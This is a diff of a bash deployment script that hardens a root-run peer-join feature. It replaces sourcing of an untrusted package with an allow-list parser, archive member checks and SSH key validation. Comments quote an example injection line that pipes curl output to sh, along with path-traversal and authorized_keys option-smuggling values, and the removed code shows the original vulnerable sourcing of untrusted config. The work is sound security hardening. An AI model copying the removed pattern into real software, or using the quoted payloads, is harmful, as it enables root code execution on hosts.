@@ -88,6 +88,7 @@ FIRST_TIME_SETUP=0
 PAIR_MODE=0
 JOIN_MODE=0
 JOIN_PACKAGE=""
+JOIN_CHECK=0
 PEER_ROLE="pull"
 PEER_HOST=""
 PEER_DATASETS=""
@@ -126,6 +127,8 @@ while [ "$#" -gt 0 ]; do
         --pair)         PAIR_MODE=1; shift ;;
         --join=*)       JOIN_MODE=1; JOIN_PACKAGE="${1#*=}"; shift ;;
         --join)         JOIN_MODE=1; JOIN_PACKAGE="${2:-}"; shift 2 ;;
+        --join-check=*) JOIN_CHECK=1; JOIN_PACKAGE="${1#*=}"; shift ;;
+        --join-check)   JOIN_CHECK=1; JOIN_PACKAGE="${2:-}"; shift 2 ;;
         --role=*)       PEER_ROLE="${1#*=}"; shift ;;
         --role)         PEER_ROLE="${2:-}"; shift 2 ;;
         --peer=*)       PEER_HOST="${1#*=}"; shift ;;
@@ -252,6 +255,206 @@ fi
 if [ $(( PEER_ROTATE + PEER_REVOKE_OLD + PEER_DRAFT_CONFIG )) -gt 1 ]; then
     echo "--rotate, --revoke-old and --draft-config are mutually exclusive -- pick one" >&2
     exit 2
+fi
+
+# ============================================================================
+# The wsad package is UNTRUSTED STRUCTURED DATA, not code.
+#
+# --join runs as root on a host that has no relationship with the sender yet --
+# that is the entire point of the feature. It used to consume the package with
+# `. "$workdir/peer.conf"`, and `source` is not a way of reading configuration:
+# it is a way of executing a file. A package containing
+#     PEER_CONF_ROLE=pull; curl http://x/y | sh
+# ran that as root. No parser bug required; command execution is the documented
+# behaviour of the operation that was used. Reported as F1 (P0) in
+# docs/reviews/REV-20260729-001.md and confirmed in the source before fixing.
+#
+# The archive was also extracted before anyone checked what was in it, so path
+# traversal, absolute paths, symlinks and extra payload members all had a free
+# ride.
+#
+# There is a second-order sink worth naming: --join writes the values it read
+# into a manifest that later runs get through `.` again. A value carrying a
+# newline would therefore inject whole lines into a file that IS sourced, later,
+# by a different invocation. The grammar checks below are what closes that too,
+# which is why they reject control characters rather than merely quoting well.
+# ============================================================================
+
+# Exactly two members, exact names, nothing else. This one check covers most of
+# the archive attacks by itself: '../../etc/cron.d/payload', an absolute path,
+# a duplicate peer.conf and any extra member are all "not exactly these two
+# names, once each".
+#
+# A member name containing a newline could split into two lines that LOOK like
+# the expected pair; that is caught after extraction instead, where the file
+# with the real (newline-bearing) name is not a regular file at either path.
+assert_package_members() {
+    local pkg="$1" names
+    names=$(tar -tzf "$pkg" 2>/dev/null) || die "could not read $pkg -- not a valid wsad (expected a gzipped tar)"
+    local expected; expected=$(printf 'peer.conf\npubkey.pub\n')
+    local got; got=$(printf '%s\n' "$names" | grep -v '^$' | sort)
+    [ "$got" = "$expected" ] || die "$pkg does not contain exactly the two expected members. Found: $(printf '%s' "$names" | tr '\n' ' ')-- a wsad is peer.conf + pubkey.pub and nothing else. Refusing to unpack it."
+}
+
+# --- peer.conf: parsed by allow-list, never executed ------------------------
+declare -A PC=()
+
+# Grammar helpers, deliberately narrow. Every one of these values ends up as a
+# useradd argument, a ZFS dataset name, a path component or a manifest line, and
+# each of those has its own way of turning a surprising character into a
+# surprise.
+pc_is_dataset() {
+    case "$1" in
+        ""|/*|*/) return 1 ;;
+        *[!A-Za-z0-9_.:/-]*) return 1 ;;
+        *//*|..|../*|*/../*|*/..) return 1 ;;
+    esac
+    return 0
+}
+pc_is_account() {
+    case "$1" in
+        ""|*[!a-z0-9_-]*|[!a-z_]*) return 1 ;;
+    esac
+    [ "${#1}" -le 32 ] || return 1
+    return 0
+}
+pc_is_label() {
+    case "$1" in
+        ""|.|..|*[!A-Za-z0-9._-]*) return 1 ;;
+    esac
+    [ "${#1}" -le 64 ] || return 1
+    return 0
+}
+pc_is_port() {
+    case "$1" in
+        ""|*[!0-9]*) return 1 ;;
+    esac
+    [ "$1" -ge 1 ] && [ "$1" -le 65535 ]
+}
+
+parse_peer_conf() {
+    local file="$1" line key val n=0
+    while IFS= read -r line || [ -n "$line" ]; do
+        n=$((n + 1))
+        # A package written on a CRLF box is a format problem to report, not a
+        # stray \r to carry into a username.
+        line="${line%$'\r'}"
+        case "$line" in ''|'#'*) continue ;; esac
+        case "$line" in *=*) ;; *) die "peer.conf line $n is not a KEY=VALUE assignment: '$line'" ;; esac
+        key="${line%%=*}"
+        val="${line#*=}"
+        case "$key" in
+            PEER_CONF_ROLE|PEER_CONF_DATASETS|PEER_CONF_TARGET|PEER_CONF_AS|\
+            PEER_CONF_ACCOUNT|PEER_CONF_PORT|PEER_CONF_INITIATOR_LABEL) ;;
+            *) die "peer.conf line $n has unknown key '$key' -- a wsad has a fixed set of keys and anything else means the package was not produced by --pair" ;;
+        esac
+        [ -z "${PC[$key]+x}" ] || die "peer.conf has '$key' twice (line $n) -- refusing to guess which one was meant"
+        # One optional layer of double quotes, as --pair writes for DATASETS.
+        case "$val" in
+            \"*\") val="${val#\"}"; val="${val%\"}" ;;
+        esac
+        # Nothing that only matters when a string is EXECUTED has any business
+        # in a file that is only ever read.
+        case "$val" in
+            *[\"\'\\\$\`]*) die "peer.conf value for '$key' contains a quote, backslash, \$ or backtick -- these have no meaning in a value that is never executed, and every reason to be there is a bad one" ;;
+            *[!\ [:print:]]*) die "peer.conf value for '$key' contains a control character" ;;
+        esac
+        PC["$key"]="$val"
+    done < "$file"
+}
+
+validate_peer_conf() {
+    local k ds
+    for k in PEER_CONF_ROLE PEER_CONF_TARGET PEER_CONF_ACCOUNT PEER_CONF_AS \
+             PEER_CONF_INITIATOR_LABEL; do
+        [ -n "${PC[$k]:-}" ] || die "peer.conf is missing $k (or it is empty) -- not a valid wsad"
+    done
+    case "${PC[PEER_CONF_ROLE]}" in
+        pull|push) ;;
+        *) die "peer.conf PEER_CONF_ROLE='${PC[PEER_CONF_ROLE]}' -- must be 'pull' or 'push'" ;;
+    esac
+    case "${PC[PEER_CONF_AS]}" in
+        root|delegated) ;;
+        *) die "peer.conf PEER_CONF_AS='${PC[PEER_CONF_AS]}' -- must be 'root' or 'delegated'" ;;
+    esac
+    pc_is_dataset "${PC[PEER_CONF_TARGET]}" \
+        || die "peer.conf PEER_CONF_TARGET='${PC[PEER_CONF_TARGET]}' is not a valid ZFS dataset name"
+    pc_is_account "${PC[PEER_CONF_ACCOUNT]}" \
+        || die "peer.conf PEER_CONF_ACCOUNT='${PC[PEER_CONF_ACCOUNT]}' is not a valid account name (this string is passed to useradd)"
+    pc_is_label "${PC[PEER_CONF_INITIATOR_LABEL]}" \
+        || die "peer.conf PEER_CONF_INITIATOR_LABEL='${PC[PEER_CONF_INITIATOR_LABEL]}' is not a valid label (it becomes a path component)"
+    if [ -n "${PC[PEER_CONF_PORT]:-}" ]; then
+        pc_is_port "${PC[PEER_CONF_PORT]}" \
+            || die "peer.conf PEER_CONF_PORT='${PC[PEER_CONF_PORT]}' is not a port number in 1..65535"
+    fi
+    for ds in ${PC[PEER_CONF_DATASETS]:-}; do
+        pc_is_dataset "$ds" || die "peer.conf PEER_CONF_DATASETS contains '$ds', which is not a valid ZFS dataset name"
+    done
+    if [ "${PC[PEER_CONF_ROLE]}" = "pull" ] && [ -z "${PC[PEER_CONF_DATASETS]:-}" ]; then
+        die "peer.conf declares role=pull but lists no datasets -- there would be nothing to delegate"
+    fi
+}
+
+# Exactly ONE public key, and one that cannot smuggle authorized_keys options.
+# `command="..." ssh-ed25519 AAAA...` is a perfectly well-formed authorized_keys
+# line; requiring the record to START with a key type is what refuses it.
+validate_pubkey_file() {
+    local f="$1" lines first
+    lines=$(grep -c '[^[:space:]]' "$f" 2>/dev/null || echo 0)
+    [ "$lines" -eq 1 ] || die "pubkey.pub must hold exactly one public key, found $lines non-blank lines"
+    first=$(grep -m1 '[^[:space:]]' "$f")
+    case "$first" in
+        ssh-ed25519\ *|ssh-rsa\ *|ecdsa-sha2-nistp256\ *|ecdsa-sha2-nistp384\ *|\
+        ecdsa-sha2-nistp521\ *|sk-ssh-ed25519@openssh.com\ *|sk-ecdsa-sha2-nistp256@openssh.com\ *) ;;
+        *) die "pubkey.pub does not start with a public key type -- an authorized_keys options prefix (command=\"...\", environment=\"...\") is not accepted here" ;;
+    esac
+    case "$first" in
+        *[!\ [:print:]]*) die "pubkey.pub contains a control character" ;;
+    esac
+    ssh-keygen -lf "$f" >/dev/null 2>&1 \
+        || die "pubkey.pub is not a public key OpenSSH can read"
+}
+
+# do_join_check -- everything --join does to a package before it is willing to
+# believe it, and then nothing. Prints the normalised values so a legitimate
+# package can be inspected, and exits non-zero on the first thing it does not
+# like. Useful on its own (look before you run it as root on a box that trusts
+# nobody), and it is what makes the trust boundary testable without root.
+do_join_check() {
+    [ -n "$JOIN_PACKAGE" ] || die "--join-check needs a package path"
+    [ -r "$JOIN_PACKAGE" ] || die "cannot read wsad package: $JOIN_PACKAGE"
+    assert_package_members "$JOIN_PACKAGE"
+    local workdir; workdir=$(mktemp -d) || die "mktemp -d failed"
+    chmod 700 "$workdir"
+    trap 'rm -rf "$workdir"' EXIT
+    tar --no-same-owner --no-same-permissions -C "$workdir" -xzf "$JOIN_PACKAGE" \
+        || die "could not unpack $JOIN_PACKAGE -- not a valid wsad?"
+    local f
+    for f in peer.conf pubkey.pub; do
+        [ -L "$workdir/$f" ] && die "$f in the package is a symlink -- a wsad holds two regular files"
+        [ -f "$workdir/$f" ] || die "$f did not unpack as a regular file -- refusing to read it"
+    done
+    parse_peer_conf "$workdir/peer.conf"
+    validate_peer_conf
+    validate_pubkey_file "$workdir/pubkey.pub"
+    echo "package OK: $JOIN_PACKAGE"
+    local k
+    for k in PEER_CONF_ROLE PEER_CONF_AS PEER_CONF_ACCOUNT PEER_CONF_TARGET \
+             PEER_CONF_DATASETS PEER_CONF_PORT PEER_CONF_INITIATOR_LABEL; do
+        printf '  %-26s %s\n' "$k" "${PC[$k]:-}"
+    done
+    printf '  %-26s %s\n' "pubkey" "$(pubkey_fingerprint "$workdir/pubkey.pub")"
+    return 0
+}
+
+# --join-check validates a package and exits. It changes nothing, reads nothing
+# outside the package, and therefore has no reason to demand root -- which also
+# makes the trust boundary testable on any machine, instead of only on a host
+# where a mistake in the test would create a real account. It runs BEFORE the
+# root check for exactly that reason.
+if [ "$JOIN_CHECK" -eq 1 ]; then
+    do_join_check
+    exit $?
 fi
 
 [ "$(id -u)" -eq 0 ] || die "run as root"
@@ -1546,19 +1749,53 @@ EOF
 # the one this specific package describes.
 do_join() {
     [ -r "$JOIN_PACKAGE" ] || die "cannot read wsad package: $JOIN_PACKAGE"
-    local workdir; workdir=$(mktemp -d)
-    tar -C "$workdir" -xzf "$JOIN_PACKAGE" || die "could not unpack $JOIN_PACKAGE -- not a valid wsad?"
-    [ -r "$workdir/peer.conf" ] && [ -r "$workdir/pubkey.pub" ] || die "$JOIN_PACKAGE is missing peer.conf or pubkey.pub -- not a valid wsad"
-    # shellcheck disable=SC1090
-    . "$workdir/peer.conf"
-    [ -n "${PEER_CONF_ROLE:-}" ] || die "peer.conf missing PEER_CONF_ROLE"
-    [ -n "${PEER_CONF_TARGET:-}" ] || die "peer.conf missing PEER_CONF_TARGET"
-    [ -n "${PEER_CONF_ACCOUNT:-}" ] || die "peer.conf missing PEER_CONF_ACCOUNT"
 
-    local label; label=$(printf '%s' "${PEER_CONF_INITIATOR_LABEL:-unknown}" | tr -c 'A-Za-z0-9._-' '-')
+    # ---- everything from here to "validation complete" happens BEFORE the
+    # first persistent change. Nothing below creates an account, touches
+    # authorized_keys, delegates ZFS or writes a manifest until the whole
+    # package has been read and accepted. ----
+    assert_package_members "$JOIN_PACKAGE"
+
+    local workdir; workdir=$(mktemp -d) || die "mktemp -d failed"
+    chmod 700 "$workdir"
+    # A rejected package must leave nothing behind, including on every path
+    # below that die()s. EXIT, not RETURN: die() exits the shell, so a RETURN
+    # trap -- the obvious choice -- would fire on exactly the paths that do not
+    # need it and on none of the ones that do.
+    trap 'rm -rf "$workdir"' EXIT
+    # --no-same-owner/--no-same-permissions: the archive does not get to decide
+    # who owns what it unpacks, nor to hand itself a setuid bit.
+    tar --no-same-owner --no-same-permissions -C "$workdir" -xzf "$JOIN_PACKAGE" \
+        || die "could not unpack $JOIN_PACKAGE -- not a valid wsad?"
+
+    local f
+    for f in peer.conf pubkey.pub; do
+        [ -L "$workdir/$f" ] && die "$f in the package is a symlink -- a wsad holds two regular files"
+        [ -f "$workdir/$f" ] || die "$f did not unpack as a regular file -- refusing to read it"
+    done
+
+    parse_peer_conf "$workdir/peer.conf"
+    validate_peer_conf
+    validate_pubkey_file "$workdir/pubkey.pub"
+
+    # Local aliases, now that every value has been checked. Named as before so
+    # the rest of this function reads unchanged.
+    local PEER_CONF_ROLE="${PC[PEER_CONF_ROLE]}"
+    local PEER_CONF_TARGET="${PC[PEER_CONF_TARGET]}"
+    local PEER_CONF_ACCOUNT="${PC[PEER_CONF_ACCOUNT]}"
+    local PEER_CONF_AS="${PC[PEER_CONF_AS]}"
+    local PEER_CONF_DATASETS="${PC[PEER_CONF_DATASETS]:-}"
+    local PEER_CONF_INITIATOR_LABEL="${PC[PEER_CONF_INITIATOR_LABEL]}"
+
+    # pc_is_label already refused anything this would have had to rewrite, so
+    # the old sanitising tr is gone: a label that needed sanitising is now a
+    # package to reject, not one to quietly repair.
+    local label="$PEER_CONF_INITIATOR_LABEL"
     local mpath; mpath=$(peer_manifest_path "$label")
     local new_fp; new_fp=$(pubkey_fingerprint "$workdir/pubkey.pub")
     local new_pub; new_pub=$(cat "$workdir/pubkey.pub")
+    log "package accepted: role=$PEER_CONF_ROLE as=$PEER_CONF_AS account=$PEER_CONF_ACCOUNT from '$label'"
+    # ---- validation complete; persistent changes start here ----
     mkdir -p "$PEER_STATE_DIR"
 
     # ---- collision detection: manifest already exists under this label with
@@ -1649,16 +1886,18 @@ do_join() {
         fi
     fi
 
+    # Quoted, and written from values the grammar checks already accepted. This
+    # file is read back with `.` by later runs, so it is the second sink for
+    # anything the package could smuggle -- belt and braces on purpose.
     cat > "$mpath" <<EOF
 # peer pairing manifest (join side) -- managed by deploy.sh --join, do not edit by hand
-PEER_JOIN_ROLE=$PEER_CONF_ROLE
+PEER_JOIN_ROLE="$PEER_CONF_ROLE"
 PEER_JOIN_DATASETS="$PEER_CONF_DATASETS"
-PEER_JOIN_TARGET=$PEER_CONF_TARGET
-PEER_JOIN_ACCOUNT=$account
-PEER_JOIN_FINGERPRINT=$new_fp
+PEER_JOIN_TARGET="$PEER_CONF_TARGET"
+PEER_JOIN_ACCOUNT="$account"
+PEER_JOIN_FINGERPRINT="$new_fp"
 EOF
     chmod 0600 "$mpath"
-    rm -rf "$workdir"
 
     echo
     log "===================================================================="
